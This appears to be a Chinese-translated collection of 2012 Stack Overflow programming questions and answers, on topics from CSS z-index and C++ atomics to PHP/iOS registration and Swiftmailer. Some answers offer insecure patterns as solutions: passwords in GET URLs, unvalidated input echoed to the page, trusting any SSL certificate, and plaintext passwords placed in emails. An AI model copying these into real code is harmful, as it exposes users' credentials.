        QtGui.QMessageBox.information(self, tr("Information"), tr("A new version of iQuality is available (%s). Updates includes performance enhancements, bug fixes, new features and fixed parsers.<br /><br />You can grab it from the bottom box of the main window, or from the <a href=\"%s\">iQuality website</a>.") % (e.newest, config.website), QtGui.QMessageBox.Ok) 
```

在当前设计中，检查在第一个警告/异常时停止。当然，异常应该停止代码，但警告应该只向用户显示一条消息，然后继续。我怎么能这样设计呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T08:42:50.290

也许您应该查看 Python 的[警告机制](http://docs.python.org/2/library/warnings.html)。

它应该允许您在不停止程序的情况下警告用户危险情况。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T09:31:45.213

尽管 python 提供了警告机制，但我发现这样做更容易：

1.  类的子类警告`Warning`。
2.  使用`_warnings`列表并将所有警告附加到它。
3.  在外部代码处返回`_warnings`并处理：

    ```
    try:
        _warnings = Main.sanity_check()
    except CustomException1, e:
        # handle exception
    except CustomException2, e:
        # handle exception

    for w in _warnings:
        if isinstance(w, NoSpaceWarning):
            pass # handle warning
        if isinstance(w, NewerVersionWarning):
            pass # handle warning 
    ```

# css - z-index 较高的元素仍位于 z-index 较低的元素下方

> ID：13217199
> 
> 赞同：6
> 
> 时间：2012-11-04T08:36:59.083
> 
> 标签：css, joomla

我在使用名为 Maxi Menu 的 Joomla 菜单模块时遇到了一个愚蠢的问题。这是一个屏幕截图：

![](../Images/bf721ef17b32ed5413b862b40c6e2b13.png)

[链接到网站](http://labanepal.com)

问题似乎是由于`z-index`. 我已经使用萤火虫进行了检查，但还没有发现下部菜单是如何出现在顶部的。

有趣的事实是，悬停菜单项后，它的 z-index 更改为`15000`高于页面上的任何其他菜单项。

`12000`它在其他具有类似 z 索引的菜单项下仍然如何运行？

z 索引的 Firbug 显示：

![在此处输入图像描述](../Images/235525507df91b0d5b8c10a9fd1c8212.png)

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-04T10:20:20.163

添加`position:relative`到具有 z-index 10 和 20 的两个 div。

Z 索引是从具有非静态位置（绝对、相对、固定）的第一个父级相对计算的。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-04T10:17:14.490

`z-index`您还必须向父元素添加更高的值`ul`，因此如果您有：

```
<ul class="menu banner_menu maximenuck" style="">
 <li class="maximenuck item184 parent first level1 " style="z-index : 12000;...... 
```

...然后这将解决它

```
.menu.banner_menu.maximenuck {
 z-index: 15000;
} 
```

![在此处输入图像描述](../Images/ae566449952e8454012dda4ed4460d63.png)

# unit-testing - 用于对 SingleCore PureMVC 项目进行单元测试的可能模拟框架

> ID：13217201
> 
> 赞同：2
> 
> 时间：2012-11-04T08:37:41.977
> 
> 标签：unit-testing, flexunit, puremvc

我正在加入一个古老的大型 PureMVC 单核项目。我正在努力帮助我的团队为我们拥有的东西创建单元测试，并在我们前进的过程中教他们如何编写单元测试。

我遇到了一堆模拟问题，包括对显示对象、通知的模糊引用，以及大多数具有可测试代码的函数都是私有函数的事实。

在互联网上搜索用于单元测试 puremvc 的模拟实用程序或工具主要导致项目似乎不再受支持（从 2008 年或 2010 年开始）

我在问那些活跃在社区中的人，今天有哪些工具可以解决这类问题。

谢谢。

如果这不是问这个问题的正确地方，请指点我一个可以回答这个问题的地方。

# php - 打开带有变量的 URL

> ID：13217202
> 
> 赞同：0
> 
> 时间：2012-11-04T08:37:43.257
> 
> 标签：php, ios, objective-c, xcode

所以我在我使用的服务器上有一个 php 注册脚本。

如何输入文本框（或与这些框的内容相关的变量/指针），并将它们放入 url 以注册用户。再次，PHP 和 SQL 数据库都设置好了，我只是在 iOS 中遇到了麻烦。

例子：

```
VARIABLE --- PURPOSE
uname        username
pass         password
name         first name
lname        last name 
```

现在我需要把它扔到这样的网址中

> `https://mywebsite/register.php?username=uname&password=pass&firstname=name&lastname=lname&sumbit=submit`

该脚本运行良好，我只需要在 iOS 中实现它的帮助。

非常感谢提前。你们真棒！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T13:09:08.043

您可以将 NSURLConnection 与 NSMutableURLRequest 结合使用，如下所示：

```
//Prepare URL for post
NSURL *url = [NSURL URLWithString: @"https://mywebsite/register.php"];

//Prepare the string for your post (do whatever is necessary)
NSString *postString = [@"username=" stringByAppendingFormat: @"%@&password=%@", uname, pass];

//Prepare data for post
NSData *postData = [postString dataUsingEncoding:NSUTF8StringEncoding];
NSString *postLength = [NSString stringWithFormat:@"%d", [postData length]];

//Prepare request object
NSMutableURLRequest *request = [[NSMutableURLRequest alloc] init];
[request setURL:url];
[request setTimeoutInterval:20];
[request setHTTPMethod:@"POST"];
[request setValue:postLength forHTTPHeaderField:@"Content-Length"];
[request setValue:@"application/x-www-form-urlencoded" forHTTPHeaderField:@"Content-Type"];
[request setHTTPBody:postData];

//send post using NSURLConnection
NSURLConnection connection = [[NSURLConnection alloc]initWithRequest:request delegate:self];

//Connection should never be nil
NSAssert(connection != nil, @"Failure to create URL connection."); 
```

这（使用适合您需要的 postString）应该异步（在您的应用程序的后台）向您的服务器发送一个 POST 请求，并运行您服务器上的脚本。

假设你的服务器也返回了一个答案，你可以听如下：
当创建连接时`NSURLConnection connection = [[NSURLConnection alloc]initWithRequest:request delegate:self];`，我们告诉连接我们处理服务器在同一个对象中返回的内容，即 self.

当连接返回答案时，将调用以下三个方法（将它们与上面的代码放在同一个类中）：

```
-(void)connection:(NSURLConnection*)connection didReceiveResponse:(NSURLResponse*)response
{
    //Initialize received data object        
        self.receivedData = [NSMutableData data];
        [self.receivedData setLength:0];

    //You also might want to check if the HTTP Response is ok (no timeout, etc.) 
}

-(void)connection:(NSURLConnection*)connection didReceiveData:(NSData*)data
{     
    [self.receivedData appendData:data];
}

-(void)connection:(NSURLConnection*)connection didFailWithError:(NSError*)error
{
    NSLog(@"Connection failed with err");
}

-(void)connectionDidFinishLoading:(NSURLConnection*)connection
{
    //Connection finished loading. Processing the server answer goes here.

} 
```

请记住，您必须处理 https 连接/请求附带的服务器身份验证。要允许任何服务器证书，您可以依赖以下解决方案（尽管这只是推荐用于快速原型设计和测试）： [如何使用 NSURLConnection 与 SSL 连接以获得不受信任的证书？](https://stackoverflow.com/questions/933331/how-to-use-nsurlconnection-to-connect-with-ssl-for-an-untrusted-cert)

希望有帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T08:46:46.720

用于此，NSMutableURLRequest。

将 setHTTPMethod 设置为 GET 方法。

为每个值定义：

```
[request setValue:value forHTTPHeaderField:key]; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-04T10:09:32.687

Give this a try:

url.php

```
<?php 
    //https://mywebsite/register.php?username=uname&password=pass&firstname=name&lastname=lname&sumbit=submit

    function make_safe_for_use($var){
        // run some validation here
        return($var);
    }

    if($_POST){
        //$url_username = $_POST['username']; // <--- this will work fine... but no validation...
        $url_username = make_safe_for_use($_POST['username']);
        $url_password = make_safe_for_use($_POST['password']);
        $url_firstname = make_safe_for_use($_POST['firstname']);
        $url_lastname = make_safe_for_use($_POST['lastname']);

        if($url_username > "" && $url_password > "" && $url_firstname > "" && $url_lastname > ""){
            // if all of the variables are set, then use them....
            $url = "register.php?username=".$url_username."&password=".$url_password."&firstname=".$url_firstname."&lastname=".$url_lastname."&sumbit=submit";
            header("Location: ".$url);
            exit(); // prevents any more code executing and redirects to the url above
        }
    }

?>
<form action="url.php" method="post">
    (Remove the value="donkeykong" part of each of the following, here for demo)<br /><br />
    Username <input type="text" name="username" id="username" value="donkeykong" /><br />
    Password <input type="password" name="password" id="password" value="cheese123" /><br />
    Firstname <input type="text" name="firstname" id="firstname" value="bruce" /><br />
    Lastname <input type="text" name="lastname" id="lastname" value="wayne" /><br />
    <input type="submit" value="go" />
</form> 
```

register.php

```
<?php

    //print_r($_GET); // - for testing

    if($_GET){

        $url_username = $_GET['username'];
        $url_password = $_GET['password'];
        $url_firstname = $_GET['firstname'];
        $url_lastname = $_GET['lastname'];

        echo "username: ".$url_username."<br />";
        echo "password: ".$url_password."<br />";
        echo "firstname: ".$url_firstname."<br />";
        echo "lastname: ".$url_lastname."<br />";
    }

?> 
```

# java - ANDROID 的 OCR 代码和 Java 代码的问题

> ID：13217203
> 
> 赞同：1
> 
> 时间：2012-11-04T08:37:47.020
> 
> 标签：java, android, android-activity, ocr, tesseract

这是我使用 tesseract 的 java 包装器 tess4j 将相机拍摄的图片转换为文本的代码！我已经包含了将它们添加到我的路径中的 jar 文件！代码没有显示任何语法错误！我启动默认相机，它启动我拍照，它显示在我声明的图像视图中，但是编辑框似乎是空的，尽管它应该显示 OCR 的结果！

```
package your.apnakaam.namespace;
import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.graphics.Bitmap;
import android.widget.ImageView;
import android.graphics.Bitmap;
import android.graphics.Rect;
import android.util.Log;
import java.io.File;
import java.util.ArrayList;
import java.util.Iterator;
import java.io.File;
import java.io.File;
import net.sourceforge.tess4j.*;
public class KaamsekhaActivity extends Activity 
{
    private static final int CAMERA_REQUEST = 1888; 
        private ImageView imageView;
//**************************************************************************************************
private Intent data;

/** Called when the activity is first created. */
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    //setContentView(R.layout.main);
    setContentView(R.layout.apna_layout);
    Button capt_but = (Button)findViewById(R.id.capture_btn);
    this.imageView = (ImageView)this.findViewById(R.id.picture);

    capt_but.setOnClickListener(new View.OnClickListener()
    {
        //@Override
    // TODO Auto-generated method stub          
             public void onClick(View v)
             {
                 Intent cameraIntent = new Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE); 
                 startActivityForResult(cameraIntent, CAMERA_REQUEST); 
             }
    }); 
}
    protected void onActivityResult(int requestCode, int resultCode, Intent data)
    {  
       if (requestCode == CAMERA_REQUEST && resultCode == RESULT_OK) 
       {  
            Bitmap photo = (Bitmap) data.getExtras().get("data"); 
            imageView.setImageBitmap(photo);
            void myfunction()
       }  
    }
    public void myfunction()
    {
        TextView disp = (TextView)findViewById(R.id.editText1);
        File new_pic = (File) data.getExtras().get("data");
        Tesseract instance = Tesseract.getInstance(); // JNA Interface Mapping
        try 
        {   
            String result = instance.doOCR(new_pic);
            disp.setText(result);
        } 
        catch (TesseractException e)
        {
            System.err.println(e.getMessage());
        }
    } 
```

}

我无法弄清楚代码有什么问题！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-06T05:45:54.080

函数 doOCR 采用在 android 中无法使用的缓冲图像！Bufferedimage 使用了在 java 中使用但在 android 中没有的 IIOimage！

# verilog - 系统 verilog 构造是否可综合？

> ID：13217206
> 
> 赞同：1
> 
> 时间：2012-11-04T08:38:28.767
> 
> 标签：verilog, fpga, system-verilog, synthesis

该构造是否可`do <blah> while (0)`在系统 verilog 中综合？

我问是因为我有一些复杂的宏，我希望使用这种语法来保护它们。

例如

```
`define my_macro(arg1) \
    do \
         my_reg <= arg1; \
         valid <= 1; \
    while (0) 
```

或者我可以使用类似的verilog构造。Verilog 将是首选，因为它被更多工具使用。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-05T13:23:02.377

SystemVerilog 中的循环结构，例如 for、while、do...while、repeat，可以在现代逻辑合成器中合成当且仅当条件表达式可以在精化（或编译时间）期间展开和计算。这对工具来说不是问题，因为该工具只是使用了来自编译器的循环展开技术。通过这种方式，必须在编译期间计算条件表达式（意味着不能在运行时动态更改）以确定循环的终止条件是什么。

有时即使循环有终止条件，但工具可能有一些限制，限制循环展开不超过阈值，例如 1k 或 10k，以防止在展开和展开循环体上浪费太多时间（工具不知道限制，它只是不断尝试和测试终止条件）

在以下示例中，可以合成循环。

```
for (i=0; i < 10; i=i+1)
for (i=0; i < WIDTH; i=i+1)  // if WIDTH is a constant, or a parameter

for (i=0; i < 10; i=i+1) begin
  ...
  if (i > 5) break;          // `continue' and `break' are also supported if the loop
                             // follows the synthesizable rules.
  ...
end 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T13:21:59.297

只是想扩展我在回复此评论时所说的话：

> > 开始和结束有什么问题？– 保罗 S 昨天
> 
> @PaulS：因为那时 my_macro(1); 展开到开始结束；后面的分号是语法错误。调用我的宏的人如何知道它是单语句还是多语句？（或者它甚至可能改变......） - 戴夫昨天

UVM 库广泛使用以下习语：

```
`define uvm_info(ID,MSG,VERBOSITY) \
   begin \
     if (uvm_report_enabled(VERBOSITY,UVM_INFO,ID)) \
       uvm_report_info (ID, MSG, VERBOSITY, `uvm_file, `uvm_line); \
   end 
```

我从来没有让 IES 报告语法错误，因为我在那个宏上放了一个尾随分号，而且我很确定我经常这样做。当然，我在规范中找不到它是否应该是语法错误，但我认为它被解释为空语句。

无论如何，我认为说 if`my_macro`是一个单独的语句它应该包含它的`;`. 然后单语句和多语句宏以相同的方式工作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T05:46:24.027

不，它不是......更好地使用开始......结束

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-05-01T22:28:49.057

@dave，你可以试试这个：

```
`define my_macro(arg1) \
  if (1) \
    my_reg <= arg1; \
    valid <= 1; \
  else 
```

在任何语言中，使用 'if...else' 不会比使用 'do...while' 更加低效，因此首选前者。[这是](http://www.parashift.com/c++-faq/macros-with-multi-stmts.html)C++ FAQ-lite 的链接，说明了类似的结构。还使用“if...else”使其成为 Verilog-1995，而不是 SystemVerilog 构造。

顺便说一句@Paul S，放置';'时会出现语法错误 在宏之后，在这样的代码中：

```
if (foo)
  `uvm_info (get_type_name(), "foo", UVM_DEBUG);
else
  `uvm_info (get_type_name(), "not foo", UVM_DEBUG); 
```

我不确定为什么 UVM 选择这样做而不是遵循 SW 世界多年来所做的事情......使用'do...while（）'或'if...else'来允许宏用户放置那个分号。可能与 C/C++ 不同，在 Verilog/SV 中，由于“`”，宏与任务明显不同，因此 UVM 期望宏的用户没有“;” 在末尾？

# python - django 管理页面中的嵌套字段集

> ID：13217209
> 
> 赞同：2
> 
> 时间：2012-11-04T08:39:38.313
> 
> 标签：python, django, django-models, django-admin

试图更好地理解 Django Admin，但在 django admin 中放置嵌套字段集时遇到问题

我想对我的模型字段进行分组，如下图所示。

我尝试使用此代码，但没有成功。

```
 class ContactAdmin(admin.ModelAdmin):
        fieldsets = (
                     ("Main Info", {'fields': ("user", "website")}),
                     ("Phones", {'fields': (
                          ("Primary", {'fields': (("primary_phone_country", "primary_phone_area", "primary_phone_number"),)}),
                          ("Secondary", {'fields': (("secondary_phone_country", "secondary_phone_area", "secondary_phone_number"),)}),
    )}),
)

    admin.site.register(Contact, ContactAdmin) 
```

![在此处输入图像描述](../Images/1e127406c308ae184950bc5cb53536ea.png)

有解决上述问题的解决方案吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T12:55:46.677

如果我正确理解此[Django 票证](https://code.djangoproject.com/ticket/10590)，则不支持嵌套字段集。虽然这张票是 4 年的，但它是在 9 个月前更新的，而且 Django 文档中没有提到嵌套字段集。

话虽如此，票证包含一个补丁来实现该功能。你试过使用它吗？

# c++ - 如何检测用户在 C++（控制台）中是否按下了任何键？

> ID：13217212
> 
> 赞同：2
> 
> 时间：2012-11-04T08:40:47.653
> 
> 标签：c++, keyboard, keypress, keydown, visual-c++-2010

我正在编写一个 C++ CLI 应用程序，如何检测用户是否按下了任何键。我已经在 c# 中看到过，但是如何在 c++ 中实现

```
while(1)
     {
      while(/* code to check if any key is pressed*/)
           {        //rest of the code
                    // sleep function
           }
     } 
```

提示：就像在 CLI 游戏中，当按键被按下时移动或采取某些动作，或者如果没有输入则不做任何事情。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T10:05:44.313

至少在 Windows 上你可以使用[GetKeyState](http://msdn.microsoft.com/en-us/library/windows/desktop/ms646301%28v=vs.85%29.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T10:34:27.453

我们可以在 C++ 中使用 _kbhit() 函数。如果按下任何键，_kbhit 等于 1。您必须清除 _kbhit 缓冲区，否则它将保持 1。清除方法是 character = getch(); 这会将最后输入的键保存在字符中，您可以比较并决定对哪个键执行哪个操作。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-11-04T11:31:08.953

虽然循环可能会消耗 CPU，但我不建议使用忙等待方法，而是应该考虑事件挂钩。

在这里您可以阅读有关挂钩[C++ Win32 键盘事件的 winapi 按键事件](https://stackoverflow.com/questions/1437158/c-win32-keyboard-events)

如果您仍然对使用 while 循环感兴趣，您还应该在检查条件为假后通过休眠来释放一些资源（例如 nanosleep ）

# c++ - 与 std::shared_ptr 一起使用时，std::atomic load 方法会减少引用计数

> ID：13217213
> 
> 赞同：6
> 
> 时间：2012-11-04T08:40:50.580
> 
> 标签：c++, c++11, shared-ptr, atomic

我想`std::atomic<std::shared_ptr>`在我的代码中使用 a 以便可以自动更新 shared_ptr，但是在访问 shared_ptr 时我遇到了问题。atomic 上的 load() 方法似乎减少了 shared_ptr 上的引用计数，因此如果没有释放它，我实际上无法使用该对象。

这是显示问题的简化代码...

```
typedef shared_ptr<MyClass> MyClassPtr;
typedef atomic<MyClassPtr> MyClassAtomicPtr;

// 1.
MyClassPtr ptr( new MyClass() );
printf("1\. use_count=%d\n", ptr.use_count());

// 2\. 
MyClassAtomicPtr atomicPointer(ptr);
printf("2\. use_count=%d\n", ptr.use_count());

// 3.
{
    MyClassPtr p = atomicPointer.load();
    printf("3a. use_count=%d\n", ptr.use_count());
}
printf("3b. use_count=%d\n", ptr.use_count());

// 4.
{
    MyClassPtr p = atomicPointer.load();
    printf("4a. use_count=%d\n", ptr.use_count());
}
printf("4b. use_count=%d\n", ptr.use_count()); 
```

这个的输出是：

```
1\. use_count=1
2\. use_count=2
3a. use_count=2
3b. use_count=1
4a. use_count=1
4b. use_count=-572662307 
```

我理解第 1 步和第 2 步。但是在第 3 步中，我希望分配给 shared_ptr 以将 ref-count 增加到 3，然后当它超出范围时 ref-count 会降到 2。但是事实上，它在分配时保持在 2，然后在 shared_ptr 超出范围时减少到 1。同样在第 4 步中，引用计数变为零并且对象被删除。

所以我的问题是：如何访问和使用由 atomic 管理的 shared_ptr 而不会破坏它？

（我正在使用 Visual Studio 2012 版本 11.0.50727.1 RTMREL 进行编译）

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-04T10:16:03.183

您不能`std::shared_ptr<T>`将`std::atomic<T>`. “模板参数 T 的类型应该是可简单复制的。” （N3290 中的§29.5 1）`std::shared_ptr<T>`不可轻易复制。

显然，在您的示例中`std::memcpy`（或类似的示例）用于复制`std::shared_ptr`，然后调用析构函数。这就是减少引用计数的原因。在最后一步中，对象被删除。

一种解决方案是使用 a`std::mutex`来保护您的`std::shared_ptr`.

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-04T10:26:02.307

我相信以原子方式加载和存储共享指针的标准方法是使用 §20.7.2.5[util.smartptr.shared.atomic] 中的函数。似乎只有 clang 的 libc++ 支持它们：

```
template<class T> bool atomic_is_lock_free(const shared_ptr<T>* p);
template<class T> shared_ptr<T> atomic_load(const shared_ptr<T>* p);
template<class T> shared_ptr<T> atomic_load_explicit(const shared_ptr<T>* p, memory_order mo);
template<class T> void atomic_store(shared_ptr<T>* p, shared_ptr<T> r);
template<class T> void atomic_store_explicit(shared_ptr<T>* p, shared_ptr<T> r, memory_order mo);
template<class T> shared_ptr<T> atomic_exchange(shared_ptr<T>* p, shared_ptr<T> r);
template<class T> shared_ptr<T> atomic_exchange_explicit(shared_ptr<T>* p, shared_ptr<T> r, memory_order mo);
template<class T> bool atomic_compare_exchange_weak(shared_ptr<T>* p, shared_ptr<T>* v, shared_ptr<T> w);
template<class T> bool atomic_compare_exchange_strong(shared_ptr<T>* p, shared_ptr<T>* v, shared_ptr<T> w);
template<class T> bool atomic_compare_exchange_weak_explicit(shared_ptr<T>* p, shared_ptr<T>* v, shared_ptr<T> w, memory_order success, memory_order failure);
template<class T> bool atomic_compare_exchange_strong_explicit(shared_ptr<T>* p, shared_ptr<T>* v, shared_ptr<T> w, memory_order success, memory_order failure); 
```

所以你的代码可以写成：

```
auto ptr = std::make_shared<MyClass>();
printf("1\. use_count=%d\n", ptr.use_count());

{
    auto p = std::atomic_load(&ptr);
    printf("3a. use_count=%d\n", ptr.use_count());
}

printf("3b. use_count=%d\n", ptr.use_count());

{
    auto p = std::atomic_load(&ptr);
    printf("3a. use_count=%d\n", ptr.use_count());
}

printf("4b. use_count=%d\n", ptr.use_count()); 
```

但是我在 MSDN 上找不到这样的支持，所以你能做的最好的就是使用互斥锁。（实际上，这些函数在 libc++ 中的实现也使用了互斥锁。）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-08-07T15:23:59.380

在实现的核心中，您调用的 std::atomic ctor 必须为其内部指针分配如下内容：

```
std::atomic(T* ctorInput) {
   memcpy(myPtr, ctorInput, sizeof(T));
} 
```

这意味着它对字节进行直接复制，绕过任何真正的复制构造函数“T(const T&)”。这就是为什么它只能在“普通可复制”类型上正常工作，即其复制构造函数无论如何都不做任何事情的原因。由于 shared_ptr 确实做了真正的工作，即原子增量，在它的复制 ctor 中，工作没有被 std::atomic 完成，因为它从不调用调用。然后，您会在引用计数中得到一个神秘的 off-by-1 错误。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2021-07-22T01:37:39.137

在`C++20`MSVC（VS 版本`16.7`）中支持`std::atomic<std::shared_ptr<T>>`.

下面我在做了一些 atomic 之后打印出引用计数`loads`。

*请注意，在撰写本文时，clang 和 gcc 都不支持这一点。*

```
std::atomic<std::shared_ptr<int>> pointer{ std::make_shared<int>( 42 ) };

{
    auto p1{ pointer.load( ) };
    // Prints 2.
    std::cout << std::format( "Count: {}\n", p1.use_count( ) );
}

auto p2{ pointer.load( ) };
// Prints 2.
std::cout << std::format( "Count: {}\n", p2.use_count( ) );

// Prints 3.
auto p3{ pointer.load( ) };
std::cout << std::format( "Count: {}\n", p3.use_count( ) ); 
```

# php - Swiftmailer：按用户 ID 进行 dbReplacements？

> ID：13217217
> 
> 赞同：0
> 
> 时间：2012-11-04T08:42:54.877
> 
> 标签：php, mysql, email, smtp, swiftmailer

Swiftmailer 文档说您可以创建自己的类来使用装饰器插件处理替换：

```
class DbReplacements implements Swift_Plugins_Decorator_Replacements {
  public function getReplacementsFor($address) {
    $sql = sprintf(
      "SELECT * FROM user WHERE email = '%s'",
      mysql_real_escape_string($address)
    );

    $result = mysql_query($sql);

    if ($row = mysql_fetch_assoc($result)) {
      return array(
        '{username}'=>$row['username'],
        '{password}'=>$row['password']
      );
    }
  }
} 
```

但在我的情况下，我的数据库包含重复的电子邮件地址，即相同的地址可以出现在 3-4 个帐户上，因此我需要根据用户 ID 获取替换。

如何修改上述课程以符合我的标准？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T09:33:10.313

由于`swiftmailer`对id一无所知，所以必须自己将email翻译成id。例如添加新属性来`DbReplacements`保存关联数组`'email' => 'id'`（当然首先限于已知ID，即。`SELECT email, id FROM user WHERE id IN(1,3,6,77)`）并`getReplacementsFor`简单地使用电子邮件作为该数组中的索引来获取用户ID。

代码示例使其更清晰：

```
class DbReplacements implements Swift_Plugins_Decorator_Replacements {
  public $email2id = array();
  public function getReplacementsFor($address) {
    $sql = sprintf(
      "SELECT * FROM user WHERE id = %d", $this->email2id[$address]
    );

    $result = mysql_query($sql);

    if ($row = mysql_fetch_assoc($result)) {
      return array(
        '{username}'=>$row['username'],
        '{password}'=>$row['password']
      );
    }
  }
}

$dbReplacer = new DbReplacements();
$decorator = new Swift_Plugins_DecoratorPlugin($dbReplacer); 
$mailer->registerPlugin($decorator);

$users = array(
    array('email'=>'john.doe@example.com', 'id' => 16),
    array('email'=>'john.doe2@example.com', 'id' => 13),
);

foreach ($users as $user) {
  $message->addTo($user['email']);
  $dbReplacer->email2id[$user['email']] = $user['id'];
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T10:22:09.810

> 如何修改上述课程以符合我的标准？

你不能。身份证不见了。除非您没有至少与相关消息相关联的 ID（即幕后发生的事件的消息），否则您将无法创建`Class Swift_Plugins_DecoratorPlugin`提供它自己的`_Replacements`接口的具体子类型，提供要求更换时的消息。

让我们创建自己的插件，它仍然是替换的装饰器插件：

```
<?php

interface My_Swift_Plugins_Decorator_Replacements extends Swift_Plugins_Decorator_Replacements
{
    public function setMessage(Swift_Mime_Message $message);
}

class My_Swift_Plugins_DecoratorPlugin extends Swift_Plugins_DecoratorPlugin implements My_Swift_Plugins_Decorator_Replacements
{

    private $_replacements;

    public function __construct(My_Swift_Plugins_Decorator_Replacements $replacements) {
        $this->_replacements = $replacements;
    }

    /**
     * Invoked immediately before the Message is sent.
     *
     * @param Swift_Events_SendEvent $evt
     */
    public function beforeSendPerformed(Swift_Events_SendEvent $evt) {
        $this->setMessage($evt->getMessage());
        parent::beforeSendPerformed($evt);
    }

    public function setMessage(Swift_Mime_Message $message) {
        $this->_replacements->setMessage($message);
    }
} 
```

如果您将 ID 分配给插件中的消息，您将在调用之前获得消息集*。*`getReplacementsFor`然后，您可以将其分配给一个属性并在该函数中读取它。

```
class DbReplacements implements My_Swift_Plugins_Decorator_Replacements {
  private $message;
  public function setMessage(Swift_Mime_Message $message) {
      $this->message = $message;
  }

  public function getReplacementsFor($address) {
    $sql = sprintf(
      "SELECT * FROM user WHERE email = '%s' and id = '%d'",
      mysql_real_escape_string($address),
      $this->message->emailID;
    );

    $result = mysql_query($sql);

    if ($row = mysql_fetch_assoc($result)) {
      return array(
        '{username}'=>$row['username'],
        '{password}'=>$row['password']
      );
    }
  }
} 
```

# c# - SetTarget 与 RegisterName/SetTargetName

> ID：13217221
> 
> 赞同：3
> 
> 时间：2012-11-04T08:43:50.947
> 
> 标签：c#, wpf, storyboard

这是一个动画形状`Y2`属性的简单程序。`Line`请注意，我使用该`SetTarget`方法来定位`Line`. 该程序运行良好。

```
using System;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Media;
using System.Windows.Media.Animation;
using System.Windows.Shapes;

namespace SoGeneratingAnimatedLine
{
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();

            var canvas = new Canvas();

            Content = canvas;

            var sb = new Storyboard();

            var line = new Line()
            {
                X1 = 10, Y1 = 10,
                X2 = 90, Y2 = 10,
                Stroke = Brushes.Black,
                StrokeThickness = 2
            };

            canvas.Children.Add(line);

            var animation = new DoubleAnimation(10, 90, new Duration(TimeSpan.FromMilliseconds(1000)));

            sb.Children.Add(animation);

            Storyboard.SetTarget(animation, line);
            Storyboard.SetTargetProperty(animation, new PropertyPath(Line.Y2Property));

            MouseDown += (s, e) => sb.Begin(this);
        }
    }
} 
```

这是一个类似的程序，它对 a 的 a 进行动画处理`EndPoint`，`LineGeometry`它是`Data`for a `Path`：

```
using System;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Media;
using System.Windows.Media.Animation;
using System.Windows.Shapes;

namespace SoGeneratingAnimatedLine
{
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();

            var canvas = new Canvas();

            Content = canvas;

            var sb = new Storyboard();

            var lineGeometry = 
                new LineGeometry(new Point(10, 10), new Point(90, 10));

            var path = new Path()
            {
                Stroke = Brushes.Black,
                StrokeThickness = 2,
                Data = lineGeometry
            };

            canvas.Children.Add(path);

            var animation =
                new PointAnimation(
                    new Point(90, 10),
                    new Point(90, 90),
                    new Duration(TimeSpan.FromMilliseconds(1000)));

            sb.Children.Add(animation);

            Storyboard.SetTarget(animation, lineGeometry);
            Storyboard.SetTargetProperty(animation, new PropertyPath(LineGeometry.EndPointProperty));

            MouseDown += (s, e) => sb.Begin(this);
        }
    }
} 
```

这第二个版本*不起作用*。但是，如果我替换该行：

```
Storyboard.SetTarget(animation, lineGeometry); 
```

和：

```
RegisterName("geometry", lineGeometry);
Storyboard.SetTargetName(animation, "geometry"); 
```

然后动画运行。

为什么`SetTarget`第二个程序的版本不起作用？什么时候可以`SetTarget`代替`RegisterName`/`SetTargetName`组合使用？这两种方法有什么区别？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T12:28:16.990

根本不需要故事板。只需直接在 LineGeometry 上调用[BeginAnimation ：](http://msdn.microsoft.com/en-us/library/ms590761.aspx)

```
lineGeometry.BeginAnimation(LineGeometry.EndPointProperty, animation); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-07-15T13:17:40.110

调用 RegisterName 是必要的，以便在代码中创建应用程序时正确连接动画故事板。这是因为故事板的关键属性之一[TargetName](https://docs.microsoft.com/en-us/dotnet/api/system.windows.media.animation.storyboard.targetname?view=netframework-4.8)使用运行时名称查找，而不是能够获取对目标元素的引用。即使可以通过代码引用访问该元素也是如此。

# scala - 定义 Stream 时应该使用 val 还是 def？

> ID：13217222
> 
> 赞同：11
> 
> 时间：2012-11-04T08:43:53.627
> 
> 标签：scala, stream

在回答 StackOverflow 问题时，我创建了一个 Stream 作为 val，如下所示：

```
val s:Stream[Int] = 1 #:: s.map(_*2) 
```

有人告诉我应该使用**def而不是****val**因为 Scala Kata 抱怨（就像 Eclipse 中的 Scala Worksheet 一样）“前向引用扩展了 value s 的定义”。

但是 Stream 文档中的示例使用 val。哪一个是对的？

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-11-04T08:43:53.627

